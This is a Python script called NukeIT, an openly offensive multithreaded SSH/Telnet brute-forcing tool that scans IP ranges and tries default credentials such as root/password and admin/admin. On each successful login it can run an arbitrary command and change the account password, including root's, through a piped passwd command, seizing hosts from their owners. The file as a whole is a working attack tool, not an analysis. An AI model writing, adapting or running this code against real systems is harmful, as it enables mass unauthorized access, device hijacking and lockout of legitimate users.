#!/usr/bin/python

__author__ = '@idigitalflame'

# NukeIT
#  SSH/Telnet Auto exploit/login.
#  Read the help -h to learn how to use.  (Too much to list here).
#  by @idigitalflame

import os
import sys
import socket
import argparse
import threading

try:
    import paramiko
    import telnetlib
except ImportError:
    print("[!] You need 'paramiko' installed!")
    print("[!] Install using 'sudo pip install paramiko'!")
    sys.exit(-1)


class Client:
    @classmethod
    def close(self):
        None

    @classmethod
    def send(self, data):
        return None

    @classmethod
    def exec_cmd(self, command):
        return None


class SSHClient(Client):
    def __init__(self, client):
        self.tunnel = None
        self.client = client

    def close(self):
        self.client.close()

    def send(self, data):
        if not self.tunnel:
            self.tunnel = self.client.invoke_shell()
            self.tunnel.settimeout(1)
        self.tunnel.send(data)
        bf = []
        if not self.tunnel.recv_ready():
            bf.append(self.tunnel.recv(500))
        try:
            while self.tunnel.recv_ready():
                bf.append(self.tunnel.recv(500))
        except:
            None
        return ''.join(bf)

    def exec_cmd(self, command):
        if not self.tunnel:
            self.tunnel = self.client.invoke_shell()
            self.tunnel.settimeout(1)
        self.tunnel.send('%s\n' % command)
        bf = []
        if not self.tunnel.recv_ready():
            bf.append(self.tunnel.recv(500))
        try:
            while 1:
                bf.append(self.tunnel.recv(500))
        except:
            None
        return ''.join(bf)


class TelnetClient(Client):
    def __init__(self, client):
        self.client = client

    def close(self):
        self.client.close()

    def send(self, data):
        self.client.write(data)
        return self.client.read_until('$', 1)

    def exec_cmd(self, command):
        self.client.write("%s\n" % command)
        return self.client.read_until('$', 1)


class NoCon(Exception):
    pass


class Exploit:
    def __init__(self):
        self.__threads = []
        self.__output = None
        self.__command = None
        self.__verbose = None
        self.__newpass = None
        self.__stopone = False
        self.__output_dir = None

    @staticmethod
    def start():
        print("""
                 _ ._  _ , _ ._
               (_ ' ( `  )_  .__)
             ( (  (    )   `)  ) _)
            (__ (_   (_ . _) _) ,__)
                `~~`\ ' . /`~~`
                ,::: ;   ; :::,
               ':::::::::::::::'
          __________/_ __ \____________
            NukeIT: SSH/Telnet Auto Login/Exploit
            @idigitalflame
            """)

    def main(self):
        Exploit.start()
        cmd = argparse.ArgumentParser(description='SSH/Telnet Auto Login/Exploit')
        cmd.add_argument('-p', action='store', dest='port', type=int,
                         help='Port to test, only valid if "-t" is specified!', default=None, required=False)
        cmd.add_argument('-o', action='store', dest='output', type=str, help='Log file output path', default=None,
                         required=False)
        cmd.add_argument('-t', action='store', dest='type', type=str,
                         help='Protocol to test; ssh (s) or telnet (t)', choices=('ssh', 'telnet', 's', 't'),
                         default=None, required=False)
        cmd.add_argument('-w', action='store', dest='timeout', type=int,
                         help='Connection timeout in seconds', default=1, required=False)
        cmd.add_argument('-m', action='store', dest='threads', type=int, help='Concurrent threads to run',
                         default=None, required=False)
        cmd.add_argument('-c', action='store', dest='command', type=str, help='Command to run on successful connect',
                         default=None, required=False)
        cmd.add_argument('-v', '--verbose', action="store_true", default=False, help='Enable verbose logging')
        cmd.add_argument('-b', action="store_true", dest='skip', default=False, help='Skip host after one successful login')
        cmd.add_argument('-x', action="store_true", dest='clear', default=False, help='Only use specified usernames/passwords')
        cmd.add_argument('targets', action='store', nargs='+', type=str, help='List of targets (comma/spaced/ranges)')
        cmd.add_argument('--user', action='store', nargs='*', type=str, dest='user',
                         help='List of additional usernames (comma/spaced)')
        cmd.add_argument('--pass', action='store', nargs='*', type=str, dest='password',
                         help='List of additional passwords (comma/spaced)')
        cmd.add_argument('-n', action='store', nargs='*', type=str, dest='new_password',
                         help='Auto change login user password to')
        ta = cmd.parse_args()
        if not ta:
            print('[!] Incorrect arguments! Please use "%s -h"!' % __file__)
            sys.exit(-1)
        if not ta.targets:
            print('[!] Please specify a target! Use "%s -h" for help"' % __file__)
            sys.exit(-1)
        targets = []
        targets_list = []
        if ta.clear and (not ta.user or not ta.password):
            print('[!] You must specify usernames and passwords with the -x argument!')
            sys.exit(-1)
        for tar in ta.targets:
            if ',' in tar:
                targets_list.extend([f.strip() for f in tar.split(',')])
            else:
                targets_list.append(tar.strip())
        for tar in targets_list:
            if '-' in tar:
                tar_list = Exploit.split_range(tar)
                for tarl in tar_list:
                    if not (tarl in targets):
                        targets.append(tarl)
            elif '/' in tar:
                print('[!] Slash notation not implemented yet!')
                sys.exit(-1)
            else:
                if not (tar in targets):
                    targets.append(tar)
        if ta.user:
            user_list = []
            for user in ta.user:
                if ',' in user:
                    for us in user.split(','):
                        usern = us.strip()
                        if not (usern in ExploitPayload.USER_LIST) or ta.clear:
                            user_list.append(usern)
                else:
                    usern = user.strip()
                    if not (usern in ExploitPayload.USER_LIST) or ta.clear:
                        user_list.append(usern)
            if len(user_list) > 0:
                ExploitPayload.USER_LIST = user_list if ta.clear else (user_list + ExploitPayload.USER_LIST)
        if ta.password:
            password_list = []
            for passs in ta.password:
                if ',' in passs:
                    for ps in passs.split(','):
                        passw = ps.strip()
                        if not (passw in ExploitPayload.PASSWORD_LIST) or ta.clear:
                            password_list.append(passw)
                else:
                    passw = passs.strip()
                    if not (passw in ExploitPayload.USER_LIST) or ta.clear:
                        password_list.append(passw)
            if len(password_list) > 0:
                ExploitPayload.PASSWORD_LIST = password_list if ta.clear else (password_list + ExploitPayload.PASSWORD_LIST)
        if ta.verbose:
            self.__verbose = True
        if ta.skip:
            self.__stopone = True
        con_type = None
        if isinstance(ta.type, str):
            if ta.type.lower() == 'ssh' or ta.type.lower() == 's':
                con_type = 1
            elif ta.type.lower() == 'telnet' or ta.type.lower() == 't':
                con_type = 2
        if ta.output:
            print('[*] Output to log file "%s"' % ta.output)
            self.__output = open(ta.output, 'a')
        port = None
        timeout = 1
        if ta.timeout:
            try:
                timeout = int(ta.timeout)
            except:
                None
        if con_type and ta.port:
            try:
                port = int(ta.port)
            except:
                print('[!] Incorrect arguments! "%s" is not a number!' % ta.port)
                sys.exit(-1)
        if ta.command:
            self.__command = ta.command
        if ta.new_password:
            self.__newpass = ta.new_password[0] if isinstance(ta.new_password, list) else ta.new_password
        self.info('NukeIT Init. %d Targets selected.' % len(targets))
        if ta.threads and len(targets) > 1:
            try:
                tc = int(ta.threads)
            except:
                print('[!] Incorrect arguments! "%s" is not a number!' % ta.threads)
                sys.exit(-1)
            if tc:
                tlen = len(targets)
                self.verbose('Threading mode selected! %d threads needed! %d targets' % (tc, tlen))
                tct = (tlen / tc)
                self.verbose('Allocated %d average targets per thread.' % tct)
                tctr = tlen - (tct * tc)
                if tct > 0:
                    tst = 0
                    thct = 0
                    while thct < tc:
                        thr = ExploitThread(self, targets[tst:tst+tct], port, con_type, timeout, thct)
                        self.verbose('Allocated thread %d with range %d-%d!' % (thct, tst, (tst+tct)))
                        tst += tct
                        thct += 1
                        self.__threads.append(thr)
                    if tctr > 0:
                        print(targets[(tc * tct) + tctr - 1:])
                        self.__threads[0].targets.extend(targets[(tc * tct) + tctr - 1:])
                    for thread in self.__threads:
                        thread.start()
                else:
                    print('[!] Too many threads! "%s" targets, "%s" threads!' % (len(targets), tct))
                    sys.exit(-1)
        else:
            if ta.threads:
                self.error('Ignoring thread count as there is one host to scan!')
            self.exploit_run(targets, port, con_type, ExploitPayload.USER_LIST, ExploitPayload.PASSWORD_LIST, timeout)

    @staticmethod
    def split_range(range_data):
        range_targets = []
        if ':' in range_data:
            rv = ':'
        else:
            rv = '.'
        trang = range_data.split(rv)
        trgv = None
        tgrvp = 0
        for trng in trang:
            if '-' in trng:
                trgv = (trng, tgrvp)
                break
            tgrvp += 1
        if not trgv:
            return None
        tss = rv.join(trang[0:trgv[1]])
        if trgv[1] < len(trang):
            tse = rv.join(trang[trgv[1] + 1:])
        else:
            tse = None
        iss = trgv[0].find('-')
        if rv == '.':
            try:
                pss = int(trgv[0][:iss])
                pse = int(trgv[0][iss + 1:])
            except:
                return None
        else:
            try:
                pss = int(trgv[0][:iss], 16)
                pse = int(trgv[0][iss + 1:], 16)
            except:
                return None
        for x in range(pss, pse):
            if not tse:
                range_targets.append('%s%s%s' % (tss, rv, (x if rv == '.' else hex(x).replace('0x',''))))
            else:
                range_targets.append('%s%s%s%s%s' % (tss, rv, (x if rv == '.' else hex(x).replace('0x','')), rv, tse))
        return range_targets

    def info(self, data, threadd=None):
        if self.__output:
            if threadd:
                self.__output.write('[*] (Thread: %s) %s\n' % (threadd, data))
            else:
                self.__output.write('[*] %s\n' % data)
        else:
            if threadd:
                print('[*] (Thread: %s) %s' % (threadd, data))
            else:
                print('[*] %s' % data)

    def error(self, data, threadd=None):
        if self.__output:
            if threadd:
                self.__output.write('[!] (Thread: %s) %s\n' % (threadd, data))
            else:
                self.__output.write('[!] %s\n' % data)
        else:
            if threadd:
                print('[!] (Thread: %s) %s' % (threadd, data))
            else:
                print('[!] %s' % data)

    def verbose(self, data, threadd=None):
        if self.__verbose:
            if self.__output:
                if threadd:
                    self.__output.write('[V] (Thread: %s) %s\n' % (threadd, data))
                else:
                    self.__output.write('[V] %s\n' % data)
            else:
                if threadd:
                    print('[V] (Thread: %s) %s' % (threadd, data))
                else:
                    print('[V] %s' % data)

    @staticmethod
    def ssh_connect(host, port, user, password, timeout):
        ssh_cli = paramiko.SSHClient()
        ssh_cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_cli.connect(host, username=user, password=password, port=port, look_for_keys=False, allow_agent=False,
                        timeout=timeout)
        return SSHClient(ssh_cli)

    @staticmethod
    def telnet_connect(host, port, user, password, timeout):
        telnet_cli = telnetlib.Telnet(host, port, timeout)
        telnet_cli.read_until("login: ")
        telnet_cli.write(user + "\n")
        telnet_cli.read_until("password: ")
        telnet_cli.write(password + "\n")
        return TelnetClient(telnet_cli)

    def exploit_ssh(self, target, port, user, password, timeout, thread):
        try:
            if port:
                con = Exploit.ssh_connect(target, port, user, password, timeout)
            else:
                con = Exploit.ssh_connect(target, 22, user, password, timeout)
            if self.__newpass:
                self.info('Changing password on user "%s" on "%s"' % (user, target))
                if user == 'root':
                    cmd_result = con.exec_cmd('echo "%s\n%s" | passwd %s' % (self.__newpass, self.__newpass, user))
                else:
                    cmd_result = con.exec_cmd('echo "%s\n%s\n%s" | passwd %s' % (password, self.__newpass, self.__newpass,
                                                                                user))
                if cmd_result:
                    self.info('Password change result result from "%s" returned\n"%s"' % (target, cmd_result))
            if self.__command:
                self.info('Running specified command on "%s"' % target)
                cmd_result = con.exec_cmd(self.__command)
                self.verbose('Ran specified command on "%s"' % target)
                if cmd_result:
                    self.info('Command result from "%s" returned\n"%s"' % (target, cmd_result))
            con.close()
            return True
        except paramiko.ssh_exception.AuthenticationException:
            self.verbose('Authentication error!', thread)
            return False
        except socket.timeout:
            raise NoCon()
        except socket.error:
            raise NoCon()
        except:
            return True

    def exploit_telnet(self, target, port, user, password, timeout, thread):
        try:
            if port:
                con = Exploit.telnet_connect(target, port, user, password, timeout)
            else:
                con = Exploit.telnet_connect(target, 23, user, password, timeout)
            if self.__newpass:
                self.info('Changing password on user "%s" on "%s"' % (user, target))
                if user == 'root':
                    cmd_result = con.exec_cmd('echo "%s\n%s" | passwd %s' % (self.__newpass, self.__newpass, user))
                else:
                    cmd_result = con.exec_cmd('echo "%s\n%s\n%s" | passwd %s' % (password, self.__newpass, self.__newpass,
                                                                                user))
                if cmd_result:
                    self.info('Password change result result from "%s" returned\n"%s"' % (target, cmd_result))
            if self.__command:
                self.info('Running specified command on "%s"' % target)
                cmd_result = con.exec_cmd(self.__command)
                self.verbose('Ran specified command on "%s"' % target)
                if cmd_result:
                    self.info('Command result from "%s" returned\n"%s"' % (target, cmd_result))
            con.close()
            return True
        except paramiko.ssh_exception.AuthenticationException:
            self.error('Authentication error!', thread)
            return False
        except socket.timeout:
            raise NoCon()
        except socket.error:
            raise NoCon()
        except:
            return True

    def exploit_run(self, targets, port, con_type, users, passwords, timeout, thread=None):
        for target in targets:
            if port:
               self.info('Trying "%s:%s"...' % (target, port), thread)
            else:
                self.info('Trying "%s"...' % target, thread)
            self.exploit_run_sub(target, port, con_type, users, passwords, timeout, thread)

    def exploit_run_sub(self, target, port, con_type, users, passwords, timeout, thread=None):
        for user in users:
            for passw in passwords:
                self.verbose('Trying user "%s", password "%s" on "%s"' % (user, passw, target))
                try:
                    if not con_type:
                        both = False
                        if self.exploit_ssh(target, port, user, passw, timeout, thread):
                            both = True
                        if self.exploit_telnet(target, port, user, passw, timeout, thread) and both:
                            if self.__stopone:
                                return
                            break
                    elif con_type == 1:
                        if self.exploit_ssh(target, port, user, passw, timeout, thread):
                            if self.__stopone:
                                return
                            break
                    elif con_type == 2:
                        if self.exploit_telnet(target, port, user, passw, timeout, thread):
                            if self.__stopone:
                                return
                            break
                except NoCon:
                    return
                except:
                    break


class ExploitPayload:
    USER_LIST = ['root', 'admin', 'sadmin']
    PASSWORD_LIST = ['password', 'root', 'abcd1234', 'admin']


class ExploitThread(threading.Thread):
    def __init__(self, exploit, targets, port, con_type, timeout, index):
        threading.Thread.__init__(self)
        self.__id = index
        self.__port = port
        self.targets = targets
        self.__timeout = timeout
        self.__con_type = con_type
        self.__exploit_host = exploit
        if not isinstance(self.targets, list):
            self.targets = [self.targets]

    def run(self):
        self.__exploit_host.verbose('Thread %s starting' % self.__id)
        self.__exploit_host.exploit_run(self.targets, self.__port, self.__con_type, ExploitPayload.USER_LIST,
                                        ExploitPayload.PASSWORD_LIST, self.__timeout, '%s' % self.__id)
        self.__exploit_host.verbose('Thread %s finished!' % self.__id)


if __name__ == '__main__':
    a = Exploit()
    a.main()
